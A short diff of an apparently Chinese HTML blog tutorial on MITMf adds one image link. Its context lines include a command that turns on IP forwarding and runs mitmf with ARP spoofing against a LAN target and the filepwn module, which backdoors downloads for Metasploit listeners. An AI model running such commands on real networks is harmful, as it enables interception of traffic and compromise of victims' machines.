@@ -41,6 +41,7 @@
 <p>gedit /usr/share/mitmf/config/mitmf.conf</p>
 </blockquote>
 <p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/C0188D9FB7E44C70987E2150C2725D5A/2666" alt="image"></p>
+<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/319EF71A78BF44D28BE76DB169073226/2673" alt="image"></p>
 <h3 id="3-启动mitmf，开启filepwn-之后msf会自动加载几个exp进行侦听"><a href="#3-启动mitmf，开启filepwn-之后msf会自动加载几个exp进行侦听" class="headerlink" title="3. 启动mitmf，开启filepwn,之后msf会自动加载几个exp进行侦听"></a>3. 启动mitmf，开启filepwn,之后msf会自动加载几个exp进行侦听</h3><blockquote>
 <p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; mitmf <strong>-</strong>-spoof –arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.106 <strong>-</strong>-filepwn</p>
 </blockquote>
